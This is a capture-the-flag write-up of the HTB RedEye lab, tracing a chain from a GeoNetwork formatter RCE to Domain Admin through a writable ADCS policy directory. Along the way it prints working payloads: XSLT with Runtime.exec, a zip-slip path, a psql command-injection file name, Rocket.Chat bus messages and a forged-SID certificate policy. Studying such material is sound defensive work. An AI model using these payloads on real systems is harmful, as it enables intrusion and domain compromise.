---
title: "HTB RedEye: from a GeoNetwork RCE to Domain Admin through ADCS"
summary: "A multi-machine box: the front leads to GN01, the ingest service leads to the domain, and a writable certificate policy on DC01 hands over the Administrator. The full path, with the why behind each step."
seoTitle: "HTB RedEye: GeoNetwork RCE to Domain Admin via ADCS"
description: "HTB RedEye writeup: a GeoNetwork RCE lands on GN01, the ingest service leads into the domain, and a writable ADCS certificate policy on DC01 gives Domain Admin."
date: 2026-11-16
lang: en
target: "HTB RedEye (10.129.28.102 → 10.129.28.183)"
tags: ["adcs", "pkinit", "geonetwork", "rce", "active-directory", "sql-injection"]
pair: htb-redeye
draft: false
---

RedEye is a multi-machine Hack The Box box. The address the platform gives you, `10.129.28.102`, is only the edge: behind it there are three machines, and the target is not the edge, it is the domain. This writeup follows the chain that worked, in the order it happened, and explains the mechanism behind each step — not just the command. The routes that closed and the lessons are at the end.

The terminal outputs were arranged into readable panels from the session logs; the RDP screenshot is a real capture. Passwords, hashes and flags are omitted.

## The scenario

The box was redeployed mid-session. The front moved from `10.129.28.102` to `10.129.28.183`, but the layout did not: the address is DC01's external NIC with DNAT into the internal network, and the same three hosts stayed behind it.

| Host | IP | Role |
| --- | --- | --- |
| FRONT | `10.129.28.102` / `.183` | DC01's external NIC; DNAT decides the backend |
| GN01 | `192.168.100.2` | Ubuntu, GeoNetwork 4.4.11 and Rocket.Chat 8.8.0 |
| DC01 | `192.168.100.1` | Windows Server 2022, Domain Controller, ADCS and ADFS |
| WKSTN01 | `192.168.100.3` | Domain-joined Windows workstation |

The front exposes no 445, 636 or 135. Port 443 terminates on DC01's ADFS, but without a credential that is just a login page. The path that gave execution was GN01, and that is where the first RCE lands.

![Attack-path map: access starts at the GeoNetwork formatter and ends at a certificate issued by DC01's CA](/img/redeye-01-path-en.webp)

The winning chain has six steps:

1. **GeoNetwork RCE** (GN01), unauthenticated, through the formatter upload.
2. **Arbitrary write + log4j2**, to turn the RCE into a stable channel.
3. **Injection in the ingest service**, to move from `geonetwork` to `gisops`.
4. **Service credential**, reused as a domain password.
5. **Local admin on WKSTN01**, to read `user.txt`.
6. **Certificate policy on ADCS**, to become Domain Admin and read `root.txt`.

Two parallel routes were confirmed but were not needed for root: Rocket.Chat admin through the Moleculer bus and the ADIDNS wildcard for NTLM coercion. Both appear in the text and in the routes that closed.

## Reconnaissance

I started with a full port scan:

```bash
nmap -Pn -sT -p- --min-rate 500 -T4 --open 10.129.28.102
```

The result is small:

| Port | Service | Note |
| --- | --- | --- |
| 22 | SSH | GN01 |
| 80 | HTTP | `geo.airways.htb`, GeoNetwork 4.4.11 |
| 443 | HTTPS | `sts.airways.htb`, ADFS on DC01 |
| 3000 | HTTP | `chat.airways.htb`, Rocket.Chat 8.8.0 |

All three names resolve to the same IP; the vhost picks the backend. `geo` hits GN01's GeoNetwork, `chat` hits GN01's Rocket.Chat and `sts` hits DC01's ADFS. SSH also lands on GN01. No Windows management port is exposed: to reach DC01, you have to get through GN01 first.

## GeoNetwork: unauthenticated code execution

GeoNetwork is an open-source geospatial catalogue. It accepts *formatters*: XSLT bundles that turn metadata into HTML, PDF and other formats. The upload lives at `/srv/api/formatters`, and the render at `/srv/api/records/<uuid>/formatters/<name>`.

The first endpoint that answered without a session was the upload itself:

```http
POST /geonetwork/srv/api/formatters HTTP/1.1
Host: geo.airways.htb
Cookie: XSRF-TOKEN=<anonymous token>
X-XSRF-TOKEN: <anonymous token>
Content-Type: multipart/form-data

file=@formatter.zip;type=application/zip
```

The only control is the anonymous XSRF cookie. The accepted bundle carries a `view.xsl` that Saxon, GeoNetwork's XSLT engine, evaluates with Java extensions enabled. That means the template can call Java classes directly. `java.lang.Runtime.exec` is one line away:

```xml
<xsl:stylesheet version="2.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
                xmlns:rt="java:java.lang.Runtime">
  <xsl:template match="/">
    <xsl:result-document href="file:///tmp/run.sh" method="text">
      { id; hostname; } > /var/lib/geonetwork/data/resources/htmlcache/out.txt 2>&1
    </xsl:result-document>
    <xsl:value-of select="rt:exec(rt:getRuntime(),'/bin/sh /tmp/run.sh')"/>
  </xsl:template>
</xsl:stylesheet>
```

`result-document` writes the script to disk; `rt:exec` calls the shell. The `GET` on the record that uses the formatter triggers the render, and the output comes back at `/geonetwork/htmlcache/out.txt`:

```text
uid=999(geonetwork) gid=989(geonetwork) groups=989(geonetwork)
GN01
```

![Anonymous formatter request and the id output: the process runs as geonetwork, uid 999](/img/redeye-02-geonetwork-en.webp)

Why does it work? Three decisions add up. The upload does not require authentication; the XSLT engine accepts Java extensions; and there is no sandbox between the template and the operating system. None of them is an RCE on its own, but together they give execution as `geonetwork`.

## From an unreliable RCE to a stable channel

The formatter render works, but it depends on the XSLT engine and a valid record id. It is a good way to prove execution, not a good way to work. I went back to the same upload with a different intent: arbitrary write.

The formatter is a ZIP. The extractor uses the entry name as a relative path and does not normalize the separator. With backslashes, an entry can climb directories and leave the bundle. Eight levels from `/var/lib/geonetwork/data/formatter/<fmt>` reach the root; the useful target is the exploded webapp:

```text
..\..\..\..\..\..\..\..\opt\geonetwork\apps\geonetwork\WEB-INF\classes\stage.sh
```

`WEB-INF/classes` is where the JVM looks for classes and configuration. Writing there is writing to the application's classpath. The upload returns 500, but it writes the file before complaining — and the error hands back the resolved path:

```json
{"message":"/var/lib/geonetwork/data/formatter/formatter1/../../../../../../../../opt/geonetwork/apps/geonetwork/WEB-INF/classes/stage.sh","code":"runtime_exception"}
```

With write access to the classpath, the next step is log4j2. log4j2 is Java's logging library; an XML configuration can declare *appenders*, and an appender is a class loaded from the classpath. I planted an XML with `packages="org.fao.geonet.api"` and a class annotated `@Plugin` in the same package. The `system/server/log` setting accepts the resource name:

```http
POST /geonetwork/srv/api/site/settings HTTP/1.1
Host: geo.airways.htb
Content-Type: application/x-www-form-urlencoded

system/server/log=log4j2-stage.xml
```

`LogUtils.refreshLogConfiguration` loads the resource from the classpath and applies it to the `LoggerContext`. The appender reads the command from `cmd.txt` (planted alongside) and runs it as uid 999. This is not Log4Shell: there is no JNDI lookup here. The vector is a logging configuration loaded from a directory we can write to.

![The path from the ZIP to the classpath and the trigger that reloads the logging XML](/img/redeye-03-zipslip-en.webp)

What was a render-dependent RCE became a repeatable channel, with the same user and without touching the service. The difference matters: the first path breaks when the formatter changes; the second stays up.

## From geonetwork to gisops

GN01 runs a GIS stack: PostGIS, a spool at `/srv/gis/spool/incoming` and `aodb-ingest.service`, triggered by `aodb-ingest.path`. systemd path units watch a directory; when a `.tif` appears, the service runs as `gisops` and builds the command like this:

```bash
layer=$(basename "${src%.*}")
raster2pgsql -s 4326 -d -I -C -F -t 256x256 "$src" "gis.${layer}" \
  | psql -q -d geonetwork_db -U gis_etl
```

The table name comes from the file name, unquoted. `raster2pgsql` generates SQL and `psql` consumes it. But `psql` also interprets meta-commands: a `\!` in the stream runs a shell command in the client process. And the client is `gisops`, even though the database user is `gis_etl`.

The file does not need to be a valid TIFF. The name is enough:

```text
z";\! id > /tmp/gisops-id;-- .tif
```

`id` comes back as `gisops` (uid 997). The next target was next door: `/etc/airport-gis/notify.env`, `root:gisops`, mode 0640 — readable by `gisops`.

```text
RC_USER=...
RC_PASS=<redacted>
```

The Rocket.Chat password was `gabby.t`'s domain password. The LDAPS bind on 636 returned `rc=0`, and the domain had `lockoutThreshold=0` — no lockout for anyone testing.

![The ingest script, the name that injects SQL and execution as gisops; the chat password is redacted](/img/redeye-04-gisops-en.webp)

Three trusts add up here: the file name is treated as a SQL identifier; `psql` accepts meta-commands; and the service account can read a secret it should never have reached. None of them is required for the ingest to work.

## The Rocket.Chat bus is not a boundary

Rocket.Chat is a Node.js chat server that uses Moleculer, a microservices framework, for its internal bus. The *transporter* is the message channel; on GN01 it listens on `127.0.0.1:36657`.

After the RCE, `127.0.0.1` stops being local. The transporter accepts packets without authentication. The framing is simple: a six-byte header, XOR of bytes 1 through 5 into byte zero, a big-endian length and a type. The event that matters is `broadcast` on the `local` stream, aimed at `watch.settings`. The MeteorService handler calls `settings.set(record)` straight into the in-memory cache.

You do not need to be an admin to publish on the bus. The effect is that the next registered account is born with the `admin` role:

```json
{"clientAction":"updated","setting":{"_id":"Accounts_RegistrationForm","value":"Public"}}
{"clientAction":"updated","setting":{"_id":"Accounts_ManuallyApproveNewUsers","value":false}}
{"clientAction":"updated","setting":{"_id":"Accounts_Registration_Users_Default_Roles","value":"admin"}}
```

After that, `POST /api/v1/users.register` creates an account through the public flow. It is born with the `admin` role because public registration now defaults to `admin`. The response confirms it:

```json
{"success":true,"user":{"roles":["admin"]}}
```

![Injection into the Rocket.Chat bus and the registration of an account born with the admin role](/img/redeye-05-rocketchat-en.webp)

The same channel also accepts `watch.integrations` with `clientAction: inserted`, which lets you insert an outgoing webhook without going through the API. I did not need to go further for the domain chain, but the primitive is there. The lesson is that authorization on the bus is not optional: whoever publishes an event controls the state that event updates.

## The domain and WKSTN01

With `gabby.t`, AD enumeration over LDAPS 636 (LDAP over TLS) was direct: users, groups, ACLs, DNS zones and templates. LDAPS only; port 389 did not exist. Two discoveries changed the map.

The first was the `airwayhtb` ADIDNS zone. DNS zones can live inside AD, and this one granted `CreateChild` to `Authenticated Users` — the right to create child records. `gabby.t` created a wildcard `*` record pointing at `192.168.100.2`. DC01's DNS then served that A record for any nonexistent name within about 30 seconds. That is passive NTLM coercion: any DC01 service resolving a name that does not exist authenticates to GN01. Existing host records were not writable (`rc=50`) and unsigned dynamic updates were refused (`rcode=9`). The LDAPS relay and RBCD were staged, but no DC01 service resolved the nonexistent name inside the window; the route closed.

The second was `isabel.o`. The account is a **direct** member of `BUILTIN\Administrators` on WKSTN01 (RID 1638):

```text
S-1-5-21-4146114734-3004133792-201478249-500   WKSTN01\Administrator
S-1-5-21-829808936-2739584302-670142182-512    AIRWAYS\Domain Admins
S-1-5-21-829808936-2739584302-670142182-1638   AIRWAYS\isabel.o
```

That is not Domain Admin; it is local admin on the workstation. But local admin reads `C$` and `ADMIN$`, and `user.txt` was on the local Administrator's desktop. I verified it twice, including over SAMR, and the contrast with `gabby.t` is the test that separates privilege from coincidence:

```text
ISABEL USER_TXT_LEN: 34
GABBY C$: ERR 0xc0000022 STATUS_ACCESS_DENIED
```

On DC01, `isabel.o` also had RDP, the `GP Management` group and access to the CA policy directory. The RDP session was not administrative — the console itself warns — but it was a valid domain session on the Domain Controller:

![RDP session on DC01 as isabel.o: sconfig shows the domain and the DC name, and the console warns the session is not administrative](/img/redeye-06-rdp.webp)

The route to writing on DC01 was that session with a looping `cmd`: it fetched jobs from the GN01 listener, ran them and posted the output back. That beacon created `C:\PolicyFiles\User.xml`. The certificate request left GN01 over DCOM/TCP 135 (the ADCS enrollment RPC), with the same account.

## ADCS: the certificate that claims to be the Administrator

ADCS is Microsoft's PKI. A certificate authority issues certificates based on *templates*; the template defines who can enroll, the EKU (Extended Key Usage, the certificate's purpose) and what goes into the certificate. The SAN (Subject Alternative Name) is where the alternative names live. PKINIT allows a certificate to be used for Kerberos logon: the KDC validates the certificate and returns a TGT (the initial Kerberos ticket). The SID extension can carry the user's security identifier.

The `AIRWAYS-DC01-CA` CA uses `TameMyCerts.Policy`, a third-party policy module that rewrites the SAN and adds custom extensions from an XML file per template. `PolicyDirectory` is `C:\PolicyFiles`, and the scheme is `<TemplateName>.xml`, reloaded **on every request**, with no service restart.

The ACL is the problem: `BUILTIN\Users` has `(CI)(AD)` and `(CI)(WD)`, which means it can create new files. Existing ones, such as `GroupPolicy_Audit.xml`, are immutable — which gives the false impression that the directory is protected. The `User` template can be requested by Domain Users and carries a client-auth EKU.

I created `C:\PolicyFiles\User.xml` as `isabel.o`, with two parts. The first clears the SAN the requester already sends: rules with `Value=""` and `Force=true` remove isabel's UPN and rfc822Name, and the next rule injects the Administrator UPN. The second adds the SID extension (`1.3.6.1.4.1.311.25.2`) with the DER for SID `-500`:

```xml
<CertificateRequestPolicy>
  <OutboundSubjectAlternativeName>
    <OutboundSubjectRule>
      <Field>userPrincipalName</Field>
      <Value></Value>
      <Mandatory>false</Mandatory>
      <Force>true</Force>
    </OutboundSubjectRule>
    <OutboundSubjectRule>
      <Field>rfc822Name</Field>
      <Value></Value>
      <Mandatory>false</Mandatory>
      <Force>true</Force>
    </OutboundSubjectRule>
    <OutboundSubjectRule>
      <Field>userPrincipalName</Field>
      <Value>Administrator@airways.htb</Value>
      <Mandatory>true</Mandatory>
      <Force>true</Force>
    </OutboundSubjectRule>
  </OutboundSubjectAlternativeName>
  <CustomCertificateExtensions>
    <CustomCertificateExtension>
      <Oid>1.3.6.1.4.1.311.25.2</Oid>
      <Value>MD2gOwYKKwYBBAGCNxkCAaAtBCtTLTEtNS0yMS04Mjk4MDg5MzYtMjczOTU4NDMwMi02NzAxNDIxODItNTAw</Value>
    </CustomCertificateExtension>
  </CustomCertificateExtensions>
</CertificateRequestPolicy>
```

The detail that burned the first attempt was the leftover SAN. Requesting a certificate with SAN `isabel` and SID `-500` returned `KDC_ERR_CLIENT_NAME_MISMATCH`: the KDC validated the requester's name, not the SID. Removing isabel's UPN and rfc822Name SANs with the `Value=""` rules fixed it. The second request, REQID=30, template `User`, RSA-2048 over DCOM/TCP 135, came back:

```text
DISP=0x3 REQID=30 MSG='Issued'
SAN=<OtherName(1.3.6.1.4.1.311.20.2.3, 'Administrator@airways.htb')>
SIDEXT=<DER for S-1-5-21-829808936-2739584302-670142182-500>
```

`DISP=0x3` means issued. The certificate belongs to isabel, but it says it is the Administrator. PKINIT believes the SID:

```bash
certipy auth -pfx adm.pfx -username Administrator -dc-ip 192.168.100.1
```

```text
Got TGT
Got hash for 'administrator@airways.htb': <redacted>
```

The rest is pass-the-hash: using the NT hash instead of the password. SMB to DC01 as `airways.htb/Administrator`, `C$`, and `root.txt` on the desktop. Domain Users to Domain Admin, with no CA restart and no interaction.

![The TameMyCerts policy, the certificate with SID -500 and the PKINIT chain to Domain Admin](/img/redeye-07-adcs-en.webp)

The KDC did not compare the SID with the account that made the request; it used the SID in the certificate. The certificate is isabel's, but the identity it carries is the Administrator's. That difference is what the policy module should have prevented.

## Failure inventory

| Where | Flaw | What it gives |
| --- | --- | --- |
| GN01 | Unauthenticated formatter upload + XSLT with Java | RCE as `geonetwork` |
| GN01 | Zip Slip in the formatter upload | arbitrary write to the classpath |
| GN01 | Log setting loads XML from the classpath | repeatable execution as `geonetwork` |
| GN01 | Unquoted `raster2pgsql` table name + `psql \!` | shell as `gisops` |
| GN01 | `notify.env` readable by `gisops` + password reuse | domain account `gabby.t` |
| GN01 | Moleculer transporter without auth + settings cache | Rocket.Chat admin |
| DC01 | ADIDNS `CreateChild` for `Authenticated Users` | passive NTLM coercion (route did not close) |
| WKSTN01 | `isabel.o` in `BUILTIN\Administrators` | `user.txt` |
| DC01 | `C:\PolicyFiles` writable by Users + TameMyCerts | Domain Admin and `root.txt` |

## Routes that closed

The box is large, and most of the time went into routes that did not close. Worth recording so they are not repeated:

- **ESC1–ESC8** were not available. These are the classic template abuses (a SAN the requester can choose, open enrollment, HTTP relay and so on). `OfflineRouter` had a SAN the requester could choose, but no enrollment right.
- **ESC13/GPO** (group OID abuse inside a certificate): `GPO-Auditors` was a honeypot, and the ACL sweep with the correct security descriptor (SD) parser produced no useful `WriteProperty` on a GPO linked to the DC.
- **LDAP relay 389** does not exist; only LDAPS. Classic RPC coercion had no Spooler, FSRVP, WebClient or EFSRPC.
- **ADIDNS → LDAPS → RBCD** (resource-based constrained delegation) was built up to the wildcard, but no DC01 service resolved the nonexistent name inside the window.
- **SQL on DC01**: WID (Windows Internal Database) only, no TCP 1433.
- **The Administrator DCC2 hash** (the cached credential on WKSTN01) was exhausted in the crack; WKSTN01's `DPAPI`/Vault protections gave nothing usable.
- **Privileged built-in groups** were empty. **ADFS `/policy`** refused the actions. **Root on GN01** and the **scheduled-task XML hijack** did not land.
- The box also went down mid-session and came back on a different IP. The redeploy did not change the state of the domain.

## What I would carry to the next target

The CA policy directory is the codification of a simple idea: if the module reads a file whose name the attacker chooses, and the directory accepts new files, the attacker controls the policy. There is no need to write to the service or restart anything. The fix is an ACL restricted to Administrators/SYSTEM and a policy that does not let the requester impose a SAN or the SID extension. For detection, monitor writes to `C:\PolicyFiles`, issuances where the SID differs from the requester, and PKINIT by privileged accounts outside the baseline (events 4886/4887 and 4768).

The second detail is the KDC. A certificate with SID `-500` is not an Administrator certificate: it is someone else's certificate claiming to be the Administrator. PKINIT did not validate the requester's identity against the SID when the policy rewrote the certificate. The lesson is to treat the SID extension as authorization data, not decoration.

The third is the boundary. `127.0.0.1` is not authentication once you have code on the host. The Moleculer transporter, the settings cache and public registration form a three-step chain that creates an admin from nothing. The same reasoning applies to `notify.env`: a chat service password was a person's domain password, and the domain had no lockout.

Finally, `raster2pgsql`: a file name is not a trusted identifier. `psql`'s `\!` turns a table-name injection into a shell. If the service runs as a service account, the database is the least of the problems. And if the AD DNS zone accepts `CreateChild` from any authenticated user, NTLM coercion becomes a matter of time — even if it did not close on this box.
